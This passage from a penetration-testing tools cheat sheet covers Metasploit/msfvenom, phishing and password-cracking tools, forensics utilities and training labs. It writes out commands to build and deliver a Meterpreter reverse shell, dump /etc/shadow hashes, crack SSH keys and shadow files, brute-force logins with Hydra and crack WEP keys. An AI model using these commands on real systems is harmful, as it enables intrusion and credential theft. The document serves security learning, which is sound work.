msfvenom -p php/meterpreter/reverse_tcp   # create a payload based on reverse_tcp
         LHOST=10.10.186.44               # set the local host to connect to 
         -f raw                           # set the format of the payload to create
         -e php/base64                    # set the encoder to use
```

Reverse shells or Meterpreter callbacks in the MsfVenom payloads can be caught on the attacker machine with a **handler**.  
This is done automatically by Metasploit when running an exploit with a payload, but needs to be manually done when running 
a custom payload crafted with MsfVenom.  
To start this handler, we can run the `exploit/multi/handler` module in Metasploit (it needs to use the same local host as in MsfVenom).

For example, we can craft a Meterpreter reverse shell binary for a x86 Linux system with : 
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> -f elf > reverse_shell.elf
```

We can then transfer this binary to the target system.  
If we have a shell on the system, we can use a python HTTP server locally and `wget` on the target system :
```shell
# on the local machine that ran msfvenom : temporarily create a HTTP web server to expose the reverse shell binary  
python3 -m http.server 9000

# on the target machine : download the reverse shell binary
wget http://<LOCAL_IP>:9000/reverse_shell.elf
```

Before we run the reverse shell on the target machine, we need a handler that can catch it on the local machine.  
We can use the `exploit/multi/handler` module but we need to set its payload to the same one as the venom reverse shell (otherwise, segmentation fault).  
```shell
# in Metasploit console
use exploit/multi/handler
set LHOST <LOCAL_IP>
set payload linux/x86/meterpreter/reverse_tcp
exploit
```

Now Metasploit is waiting for the reverse shell of the target machine to connect to it.  
We can start the reverse shell on the target machine (the port is 4444 by default both in the reverse shell and in the handler).  
```shell
chmod 777 reverse_shell.elf
./reverse_shell.elf
```

This now gives access to a Meterpreter shell in the handler of the Metasploit console.  
It can be either used directly, or put in the background and used to run some post-exploit modules :
```shell
background
use post/linux/gather/hashdump      # load a post-exploit module to list user hashes (from /etc/shadow)
sessions                            # check the session ID of the Meterpreter shell, let's assume it is 2
set session 2
exploit                             # get the hash of all users on the target machine
```

### BeEF (Browser Exploitation Framework)

BeEF is an open-source penetration testing tool designed to focus on the exploitation of web browsers.  
It is used by ethical hackers, security professionals, and penetration testers to assess the security of web applications and web browsers.  
It can be used to demonstrate various types of attacks that can be carried out through a web browser.


### Havij

Havij is an automated SQL Injection tool that helps penetration testers to find and exploit SQL Injection vulnerabilities on a web page.  
It is developed by ITSecTeam, an Iranian security organization.  
The name Havij means "carrot" in Persian language.


### BlackEye

BlackEye is an application on Kali Linux to create a fake login page for popular websites (Facebook, LinkedIn, Paypal...).  
It generates a URL to send to the victim that looks like the original login page.  
When accessed, info about the victim (IP and browser) get displayed in the Kali Linux console running BlackEye.  
When the victim enters his username and password, they are displayed to the console, and the victim is redirected to the real site.



## Password Cracking and Recovery


### Cain and Abel

Cain and Abel is a password recovery tool for Windows that can :
- sniff the network
- crack encrypted passwords (brute-force, dictionary attack)
- record VoIP conversations
- decode scrambled passwords
- reveal password boxes
- analyze routing protocols...


### Hashcat

Hashcat is an offline password recovery and cracking tool.  
It is free and accessible online as a zip folder.

It takes as input a target hash, a hashing method and a list of passwords, and it tries to find one password in the
list that generates this hash.

Hashcat can also perform mask attacks, similar to brute force attacks with constraints (password length, only alpha-numeric, ...).

All hashes found by Hashcat are stored in a _hashcat.potfile_ file.

Hashcat shows a status of `Cracked` if a match was found, `Exhausted` otherwise.  

```shell
hashcat -h                                         # display help
hashcat -a 0 -m 0 hash.txt dict.txt                # try to find a password in a dict that generates a given hash
                                                   #   -m to specify the hashing method (0 : MD5)
                                                   #   -a to specify the attack mode (0 : straight, 1 : combination, 3 : mask)
hashcat -a 1 -m 0 hash.txt dict.txt rockyou.txt    # try to find a password in multiple dicts
hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l            # try to find a password of 6 lower letters
```

Note : to get the hash for a given string, we can use an online hash tool, the `md5sum` command in Linux or the `Get-FileHash` PowerShell command :
```shell
# Linux
md5sum movie.mp4                                                 # MD5 hash of a file
echo -n "p4ssw0rd" | md5sum                                      # MD5 hash of a string

# PowerShell
Get-FileHash movie.mp4 | Format-List                              # SHA-256 hash (default)
Get-FileHash movie.mp4 -Algorithm MD5 | Format-List               # MD5 hash
```

Hashcat cannot crack a password hashed with the Yescrypt algorithm that is very CPU-intensive (for example the Debian user passwords).  
For Yescrypt hashes, we should use John the Ripper instead.



### John the Ripper

John the Ripper is another password cracking tool, offering similar functionalities as HashCat.  
It comes with a free community edition.

**Jumbo John** is a version of John the Ripper including many patches, enhancements and extensions.  
Jumbo John is pre-installed on Kali Linux, and accessible with the `john` command.  

John the Ripper uses some word lists to crack the passwords.  
A lot of password lists can be found in the [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) GitHub repo.  
In Kali, some word lists are available under `/usr/share/wordlists/`, including :
- `john.lst` : 3'500 most common passwords
- `nmap.lst` : 5'000 common passwords
- `wifite.lst` : 200'000 passwords
- `rockyou.txt` : 14 million leaked passwords

To crack a password with John, we need to specify the type of hash we are cracking (John can guess, but it is unreliable).  
We can use **HashIdentifier** (installed on Kali) to identify the hashing algorithm from a hash, or the suggestion from HashCat.  

```shell
# list all hash formats supported by John
john --list=formats

# crack some hashes in different formats
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hash.txt            # NTLM (windows account)
```
#### John Modes

The `--wordlist` mode is shown above and tries to hash a list of passwords and find a match.  

The `--single` mode targets a specific user, using word mangling to try to guess easy passwords.  
If we know that the username is `simon`, it could find a password like `Sim0n` for example.  
To use the single mode, the hash needs to be prefixed with the username, for example `simon:ef872391c15c22d8f5c41e91e2756360`.  
We can create custom rules to transform the username in `/etc/john/john.conf`.

The `--incremental` mode is used to brute-force all combinations of characters.  
```shell
john --incremental --format=raw-md5 --max-length=6 hash.txt
```

#### John rules

John allows the creation of custom rules, to try variations of passwords in the word list.  
The rules can be edited and added in the `/etc/john/john.conf` configuration file.  

In the rule pattern, we use :
- `A` : position of the original password
- `c` : try to capitalize the first letter
- `0[<characters>]` : prefix the word with a character among the list
- `z[<characters>]` : suffix the word with a character among the list

An example of custom rule that tries to capitalize and add a number or a special character or both is :
```shell
[List.Rules:MyRule]
cAz"[0-9]" 
cAz"[0-9][0-9]" 
cAz"[£!$]" 
cAz"[0-9][£!$]"
```

The rule can be specified with the `--rules=<RULES_NAME>` parameter, for example :
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --rules=MyRule hash.txt
```

Some rules are defined by default in the John config file and can be used out-of-the-box :
- `--rules=Single` : a lot of transformations for single-crack mode (based on user-specific words)
- `--rules=Wordlist` : common transformations to a base wordlist


#### Cracking Linux passwords

John the Ripper can also crack the password from Linux users.  
The password hashes are stored under `/etc/shadow`, each line contains a comma-separated list of values : 
```shell
tommy:$y$j9T$76aaae1$/OOSg64wefdehgtVPdzqiFang6uZA4QA1pzzegKdVm4:19965:0:99999:7:::

tommy : username
y : hashing algorithm (yescrypt)
j9T : parameter sent to the hashing algorithm
76aaae1 : salt
/OOSg64wefdehgtVPdzqiFang6uZA4QA1pzzegKdVm4 : password hash
```

They can be cracked with :
```shell
# Create a user and set its password
useradd -r user2
passwd user2

# crack the password for user2 (assuming it is yescrypt hash recognized with the $y$ prefix)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt /etc/shadow
```

#### John conversion tools

Some passwords need to be converted to a John-specific format to be cracked by John.  
John exposes many conversion tools for common formats called `***2john`, listed when starting John in Kali.  

A few example of conversion tools are :
- `zip2john` for password-protected ZIP archives
- `rar2john` for password-protected RAR archives
- `ssh2john` for passphrase-protected SSH keys
- `pdf2john.pl` for password-protected PDF files

```shell
# create a ZIP hash file and crack it with John
zip2john test.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# create a RAR hash file and crack it with John
rar2john test.zip > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

# create a openSSH hash file and crack it with John
ssh2john id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```


### CrackStation.net

[https://crackstation.net](https://crackstation.net) is a website for cracking unsalted hashes.  
It keeps a database of billions of hashes and their original values for common hashing methods (MD5, SHA1, SHA-256, ...).  
It can detect automatically the hashing method used and give the original value for up to 20 hashes at a time.


### Crunch

Crunch is a utility that generates a custom word list to provide to a password cracker.  
We can specify the password min and max size and the allowed characters, and Crunch generates all possibilities.  
Crunch is available by default in Kali Linux.

```shell
# generate the pins.txt file containing all possible PIN numbers of 4 to 6 digits
crunch 4 6 0123456789 -o pins.txt
```


### CeWL (Custom Word List)

CeWL is another custom word list generator that uses the content of a website to create its word list.  
It is a Ruby app that spiders a given URL up to a specific depth to capture the words for its list.  
Its generated file can then be used with password crackers like **John the Ripper** or **Wfuzz**.

```shell
# generate a word list and an emails list from a website with depth 2 and min word length 5
cewl -d 2 -m 5 -w passwords.txt http://10.10.131.23 --email --email_file emails.txt
```


### Hydra

Hydra is an open-source password brute-forcing tool for online brute-force attacks.  
It is designed to operate via network protocols like SSH, RDP, HTTP and HTML forms.  
It is sending the login attempt one-by-one to the target and checks the response for success.

Unlike Hashcat or John the Ripper, it is not an offline password cracking tool.  
It does not check passwords against a target hash, but against a target network system (so it can be detected).

```shell
# try all passwords in a word list to access the target IP in SSH with a given user (login)
# -f to stop when a valid password is found
# -v for verbose logging
hydra -l testuser -P rockyou.txt -f -v <TARGET_IP> ssh

# try all passwords in a word list to access the target IP on a given HTML form
# no user is needed to access, only a password
# we specify the login PHP page, the field to use for the password, and the message on error (separated with ":")
hydra -l '' -P pins.txt -f -v 10.10.131.34 http-post-form "/login.php:pin=^PASS^:Access Denied" -s 8000
```

### Aircrack-ng

Aircrack-ng is an open-source suite of software tools used for assessing and testing the security of Wifi networks.  
It can capture packets on a wireless network and crack poorly secured Wifi passwords.  
It is available by default in the Kali Linux distribution.

For example, Aircrack-ng can crack a WEP password in a few minutes by IV attack.    

```shell
# list wireless networks and their encryption, find one using WEP
# Note down its channel and BSSID
airodump-ng wlan0mon

# Start scanning the target wireless network
airodump-ng --channel <CHANNEL> --bssid <BSSID> --write MyHackedTraffic wlan0mon

# Keep above command running and in another terminal send an auth request
aireplay-ng --fakeauth 0 -a <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon

# Get some ARP messages
aireplay-ng --arpreplay -b <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon 

# Crack the network using the IVs from the captured traffic
# It will try to infer the WEP key from all captured IVs
# It may fail if not enough data, it reruns every 5000 data captured by the scan 
aircrack-ng MyHackedTraffic.cap
```


## Forensics Tools


### FTK Imager (Forensic Tool Kit Imager)

FTK Imager is used to create a copy of a hard drive or a USB thumbdrive as a sequence of files.  
It is a GUI-based program for Windows.  
These files have the `.dd` extension, a format compatible with multiple forensic tools.

FTK Imager can then open the drive copy and analyze it.  
It shows all the files of the drive, even the deleted ones, which can sometimes be recovered.


### Autopsy

Autopsy is an open-source digital forensics platform.  
It offers a graphical interface to the Sleuth toolkit, and adds other digital forensics tools.  

Its imaging function relies on `dd`, and its analysis function relies on the Sleuth toolkit.


### Volatility

Volatility is a command-line tool used by digital forensics and incident response teams to analyze a memory dump.  
It is a Python program called `vol.py` that can analyze memory snapshots from Linux, MacOS and Windows.

Its main functions are :
- list active and closed network connections
- list running processes
- list command line history
- extract malicious processes for later analysis

It needs to be provided with the profile of the machine from which the memory dump was generated.  
It is required to know the memory structure of the OS, so Volatility can make sense of the dump.  
Windows profiles are available by default (see list with `vol.py --info`).  
Linux profiles must be created by the user and added to the local Volatililty Linux profiles folder.

```shell
vol.py -h                   # display help
vol.py --info               # display all profiles, commands, plugins...

vol.py -f linux.mem --profile="VistaSP0x64" linux_bash     # check command history file
vol.py -f linux.mem --profile="VistaSP0x64" linux_pslist   # check running processes
vol.py -f linux.mem --profile="VistaSP0x64" linux_procdump -D <OUTPUT_FOLDER> -p <PID>  # extract binary of a process
```


### Cuckoo

Cuckoo is an open-source software to automate the analysis of suspicious files.  
It is basically a sandbox where we can put a suspicious file and observe its behavior.


### WinHex

WinHex is a commercial disk editor and universal hexadecimal editor for Windows.  
It is used for digital forensics and data recovery.

WinHex allows users to view, edit, and analyze binary data on various types of storage media, including hard drives, USB drives, memory cards...  
It offers a wide range of features for examining and manipulating data at a low level.


### DNSpy (DotNet Spy) / ILSpy (Intermediate Language Spy)

DNSpy is an open-source tool for Windows designed for the analysis and editing of .NET assemblies.  
It is commonly used for reverse engineering, debugging, and modifying .NET applications. 

ILSpy is a lightweight cross-platform .NET decompiler focused on simplicity.  
It is easier to use than DNSpy when only decompilation is required or when we use Linux or MacOS.


### FLOSS (FLARE Obfuscated String Solver)

[FLOSS](https://github.com/mandiant/flare-floss) is a tool to extract and deobfuscate strings from malware.  
It is an improvement of the default `strings.exe` on Windows that extracts strings from a binary, but cannot extract obfuscated strings.  

A common way for malware to avoid detection is to execute a base64-encoded command in Powershell with `powershell -EncodedCommand <BASE64_COMMAND>`  
This way, the malware binary does not contain a readable string of the actual command.  
FLOSS can decode them, as well as strings constructed on the stack.


### CyberChef

[CyberChef](https://gchq.github.io/CyberChef/) is a versatile web-based tool performing a wide range of data manipulation operations.  
It is very useful in cyber-security, forensics and data analysis.

It provides a user-friendly GUI where we can drag-n-drop one or more available transformations, called recipes.  
We can paste the input data (string or file) in the input section, "bake" the data and see the result in the output section.

CyberChef can be downloaded and started locally, to avoid the upload of sensitive data on the internet.

Among its many available operations, CyberChef can :
- encode/decode messages in base64/hex/binary...
- extract EXIF data from an image
- apply encryption and hashing algorithms (AES, SHA, MD5...)
- parse and decode JWT (JSON Web Token)
- identify file type using its magic byte
- auto-detect the transformation to apply with its "magic" recipe


### Frida

Frida is an open-source dynamic instrumentation toolkit for developers, reverse engineers and security researchers.  
It allows to inject custom Javascript or Python scripts into applications to inspect or modify their behavior.  
It is supported on Windows, macOS, Linux, iOS and Android.

Frida is installed with `pip install frida-tools`.

We use the `frida-trace` command to generate the stubs for common library calls :
```shell
frida-trace ./main -i '*'
```

This starts the program, and generates the Javascript stubs under the `__handlers__` folder.  
We can modify these stubs to log or modify the input/output of each function call, for example :
```javascript
defineHandler({
  onEnter(log, args, state) {
    log("PARAMETER:" + args[0]);                       // int param
    log("PARAMETER:" + Memory.readCString(args[1]));   // string param
  },

  onLeave(log, retval, state) {
    log("return value: " + retval);
    retval.replace(ptr(1))                              // modify the return value
  }
});
```

Frida can be used to hack video games or other programs by intercepting and modifying calls to libraries.


## Educational Tools


### Oxford Journal of Cyber-Security

Academic Journal from Oxford university offering free articles about Cyber-Security threats, attacks and latest defenses :  
[https://academic.oup.com/cybersecurity](https://academic.oup.com/cybersecurity)


### Hacksplaining

[Hacksplaining](https://www.hacksplaining.com/) is a security training website.  
It explains and gives examples of most common web security issues, especially the OWASP Top 10 issues.


### OWASP BWA (Broken Web Applications)

OWASP BWA is a project from the OWASP organization (Open Worldwide Application Security Project) focusing on the identification and documentation of vulnerabilities in web applications.  
It is a virtual machine image that can be launched with VMware, that contains several vulnerable web applications using legacy software versions.  

When started with VMware, we can log to the VM and check its IP, then access the web portal from `http://<VM_IP>`.  
The portal lists all the broken web applications contained in the project.  
Some of them contain cyber-security trainings to learn web application vulnerabilities (WebGoat, Ghost...).  
Others use old version of some CMS that have known vulnerabilities (WordPress, Joomla, ...).  
Others are created to look more like real modern applications (Google Gruyere, Hackxor...).  

OWASP BWA is a great tool to create a local lab to test cyber-security tools (nmap, burp, metasploit...) on machines we own.


### OWASP Juice Shop

OWASP Juice Shop is a fake e-commerce web application designed with intentional security flaws.  
It can be deployed locally in a container, and its aim is to teach web vulnerabilities.  
It is designed as a hacking game, and contains a score dashboard with a lot of challenges to break the website.


### Altoro Mutual

Altoro Mutual is a fake banking website with intentional security flaws.  
It is developed by IBM to demonstrate the efficiency of their security products.  

The application code is open source and available on [GitHub](https://github.com/HCL-TECH-SOFTWARE/AltoroJ).
